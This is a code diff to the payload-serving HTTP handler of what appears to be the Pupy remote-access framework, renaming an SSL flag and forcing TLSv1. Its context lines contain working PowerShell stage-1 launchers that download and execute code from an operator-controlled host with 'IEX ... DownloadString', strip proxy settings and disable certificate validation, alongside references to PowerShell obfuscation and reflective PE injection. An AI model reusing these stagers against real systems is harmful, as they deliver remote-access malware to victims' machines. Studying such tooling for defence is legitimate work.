@@ -12,6 +12,7 @@ from base64 import b64encode
 import re
 from pupylib.PupyCredentials import Credentials
 import tempfile
+import ssl
 
 from modules.lib.windows.powershell import obfuscatePowershellScript, obfs_ps_script
 
@@ -97,13 +98,13 @@ class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
 
             if self.server.useTargetProxy == True:
                 print colorize("[+] ","green")+"Stage 1 configured for using target's proxy configuration"
-                if not self.server.ssl:
+                if not self.server.sslEnabled:
                     launcher = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)
                 else:
                     launcher = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object Net.WebClient).DownloadString('https://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)
             else:
                 print colorize("[+] ","green")+"Stage 1 configured for NOT using target's proxy configuration"
-                if not self.server.ssl:
+                if not self.server.sslEnabled:
                     launcher = "$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)
                 else:
                     launcher = "$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object Net.WebClient).DownloadString('https://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)
@@ -129,14 +130,14 @@ class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
             self.wfile.write(APACHE_DEFAULT_404)
 
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
-    def set(self,conf, link_ip, port, ssl, useTargetProxy):
+    def set(self,conf, link_ip, port, sslEnabled, useTargetProxy):
         self.payload_conf = conf
         self.link_ip=link_ip
         self.link_port=port
         self.random_reflectivepeinj_name=''.join([random.choice(string.ascii_lowercase+string.ascii_uppercase+string.digits) for _ in range(0,random.randint(8,12))])
         self.useTargetProxy = useTargetProxy
-        self.ssl=ssl
-        if self.ssl:
+        self.sslEnabled=sslEnabled
+        if self.sslEnabled:
             credentials = Credentials()
             keystr = credentials['SSL_BIND_KEY']
             certstr = credentials['SSL_BIND_CERT']
@@ -149,7 +150,7 @@ class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
             os.write(fd_key_path, keystr)
             os.close(fd_key_path)
 
-            self.socket = wrap_socket (self.socket, certfile=tmp_cert_path, keyfile=tmp_key_path, server_side=True)
+            self.socket = wrap_socket (self.socket, certfile=tmp_cert_path, keyfile=tmp_key_path, server_side=True, ssl_version=ssl.PROTOCOL_TLSv1)
             self.tmp_cert_path=tmp_cert_path
             self.tmp_key_path=tmp_key_path
 
